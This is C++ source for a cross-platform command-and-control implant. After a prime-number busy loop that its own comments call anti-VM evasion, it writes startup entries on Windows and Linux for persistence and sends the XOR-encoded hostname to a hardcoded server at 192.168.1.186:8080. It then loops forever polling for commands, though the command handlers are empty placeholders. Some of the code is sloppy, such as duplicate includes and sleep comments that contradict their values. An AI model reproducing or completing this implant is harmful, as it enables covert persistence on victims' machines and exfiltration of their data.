#include <iostream>
#include <fstream>
#include <string>
#include <thread>
#include <chrono>
#include <vector>
#include <cstdlib>
#include <filesystem>
#include <memory>
#include <random>
#include <cmath>
#include <iostream>
#include <random>
#include <cmath>
#include <chrono>

bool is_prime(int num) {
    if (num <= 1) return false;
    if (num == 2) return true;
    if (num % 2 == 0) return false;

    int limit = std::max(2, static_cast<int>(std::sqrt(static_cast<double>(num))));
    for (int i = 3; i <= limit; i += 2) {
        if (num % i == 0) return false;
    }
    return true;
}

#ifdef _WIN32
    #include <windows.h>
    #include <wininet.h>
    #pragma comment(lib, "wininet.lib")
#else
    #include <unistd.h>
    #include <curl/curl.h>
    #include <sys/utsname.h>
#endif

// Function declarations
void send_to_server(const std::string& url, const std::string& data);
void ensure_persistence();
std::string gather_system_info();
void perform_actions();
void xor_encrypt_string(std::string& str, uint8_t key);
void xor_decrypt_string(std::string& str, uint8_t key);
void check_for_commands();

// Global variables
std::string server_url = "http://192.168.1.186:8080";
std::vector<std::string> command_queue;

// XOR Encryption for Obfuscation
void xor_encrypt_string(std::string& str, uint8_t key) {
    for (auto& ch : str) {
        ch ^= key;
    }
}

void xor_decrypt_string(std::string& str, uint8_t key) {
    for (auto& ch : str) {
        ch ^= key;
    }
}

// Cross-platform HTTP Communication to C2 Server
void send_to_server(const std::string& url, const std::string& data) {
#ifdef _WIN32
    // Windows: Using WinINet for HTTP communication
    HINTERNET hInternet = InternetOpen("MyAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return;

    HINTERNET hConnect = InternetOpenUrl(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return;
    }

    InternetWriteFile(hConnect, data.c_str(), data.length(), NULL);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

#else
    // Linux: Using libcurl for HTTP communication
    CURL *curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());
        curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
#endif
}

// Ensure persistence across reboots
void ensure_persistence() {
#ifdef _WIN32
    // Windows: Add the agent to the Startup folder
    const char* appdata = std::getenv("APPDATA");
    if (appdata) {
        std::string startup_path = std::string(appdata) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
        std::string agent_path = std::string(getenv("USERPROFILE")) + R"(\Downloads\trinitydroptop.exe)";  // Get the actual agent path based on user profile
        std::string full_path = startup_path + "trinitydroptop.bat";

        std::ofstream startup_file(full_path);
        if (startup_file.is_open()) {
            startup_file << "@echo off\n";
            startup_file << "start \"\" \"" << agent_path << "\"\n";
            startup_file.close();
            std::cout << "Persistence mechanism installed successfully at: " << full_path << std::endl;
        } else {
            std::cerr << "Failed to create startup file at: " << full_path << std::endl;
        }
    } else {
        std::cerr << "Failed to determine startup directory." << std::endl;
    }
#else
    // Linux: Add the agent to autostart
    const char* home = std::getenv("HOME");
    if (home) {
        std::string startup_path = std::string(home) + "/.config/autostart/";
        std::string agent_path = "/path/to/your/agent";  // Set your actual agent path here
        std::filesystem::create_directories(startup_path);

        std::string full_path = startup_path + "my_agent.desktop";
        std::ofstream startup_file(full_path);
        if (startup_file.is_open()) {
            startup_file << "[Desktop Entry]\n";
            startup_file << "Type=Application\n";
            startup_file << "Name=MyAgent\n";
            startup_file << "Exec=" << agent_path << "\n";
            startup_file << "Hidden=false\n";
            startup_file << "X-GNOME-Autostart-enabled=true\n";
            startup_file.close();
            std::cout << "Persistence mechanism installed successfully at: " << full_path << std::endl;
        }
    }
#endif
}

// Gather system information (different for Windows and Linux)
std::string gather_system_info() {
#ifdef _WIN32
    // Windows: Get the computer name
    char computer_name[MAX_PATH];
    DWORD buffer_size = MAX_PATH;
    if (GetComputerNameA(computer_name, &buffer_size)) {
        return std::string(computer_name);
    }
    return "Unknown";
#else
    // Linux: Get system info using uname
    struct utsname sys_info;
    if (uname(&sys_info) == 0) {
        return std::string(sys_info.nodename);  // Return the node name (hostname)
    }
    return "Unknown";
#endif
}

// Placeholder for checking commands
void check_for_commands() {
    // Placeholder for command checking logic
}

// Placeholder for performing actions
void perform_actions() {
    // Placeholder for performing actions logic
}

// Main program logic
int main() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> dis(2, 1000000);

    auto start_time = std::chrono::high_resolution_clock::now();
    auto end_time = start_time + std::chrono::minutes(2 + (rand() % 4)); // 2-6 minutes

    int num_primes = 0;
    while (std::chrono::high_resolution_clock::now() < end_time) {
        int num = dis(gen);
        if (is_prime(num)) {
            num_primes++;
        }
    }

    std::cout << "Found " << num_primes << " prime numbers in " << (end_time - start_time).count() / 60 << " minutes." << std::endl;

    try {
        // Factor prime numbers for obfuscation and anti VM
        bool is_prime(int num);

        // Ensure persistence
        ensure_persistence();

        // Gather system info
        std::string sys_info = gather_system_info();
        std::cout << "System Info: " << sys_info << std::endl;

        // Encrypt the system info and send it to the server
        xor_encrypt_string(sys_info, 0xAA);
        send_to_server(server_url, sys_info);

        // Run the agent's main loop
        while (true) {
            // Sleep for a short period to avoid consuming too much CPU
#ifdef _WIN32
            Sleep(800);  // Sleep for 100 milliseconds (Windows)
#else
            sleep(8);  // Sleep for 1 second (Linux)
#endif

            // Check for new commands from the C2 server
            check_for_commands();

            // Perform any necessary actions based on the commands received
            perform_actions();
        }
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return -1;
    }

    return 0;
}
